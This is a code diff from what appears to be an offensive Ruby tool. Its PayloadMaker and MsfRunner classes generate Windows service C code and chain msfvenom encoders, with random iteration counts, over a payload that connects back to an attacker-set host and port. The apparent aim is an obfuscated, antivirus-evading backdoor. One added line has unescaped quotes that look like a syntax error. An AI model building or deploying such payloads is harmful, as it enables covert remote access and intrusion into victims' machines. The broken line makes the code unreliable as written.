@@ -331,6 +331,7 @@ class PayloadMaker
         code =  "#include <windows.h>\n"
         code << "#include <stdio.h>\n"
         code << fake_includes.join("\n")
+        code << "#pragma comment(lib,"advapi32.lib")\n"
         code << "\n"
         code << %Q{#define SERVICE_NAME  "#{service_name}" \n}
         code << %Q{#define DISPLAY_NAME  "#{display_name}"\n}
@@ -614,8 +615,8 @@ class MsfRunner
         msf_check()
         encoder_array = get_encoder
         msfstring =  "msfvenom -p #{@payload}  lhost=#{@host}  lport=#{@port} #{@other} -f raw -e #{encoder_array[0]} -i #{random_number(10..15)} |"
-        msfstring << "msfvenom -e #{encoder_array[1]} -a x86 --platform windows -f raw -i #{random_number(2..4)} |"
-        msfstring << "msfvenom -e #{encoder_array[2]} -a x86 --platform windows -f c -i #{random_number(2..4)} -t 300"
+        msfstring << "msfvenom -e #{encoder_array[1]} -a x86 --platform windows -f raw -i #{random_number(2..4)} -t 3000 |"
+        msfstring << "msfvenom -e #{encoder_array[2]} -a x86 --platform windows -f c -i #{random_number(2..4)} -t 3000"
 
         # debug
         #msfstring =  "msfvenom -p #{@payload}  lhost=#{@host}  lport=#{@port} #{@other} -f c -e x86/jmp_call_additive -i #{random_number(10..15)} "
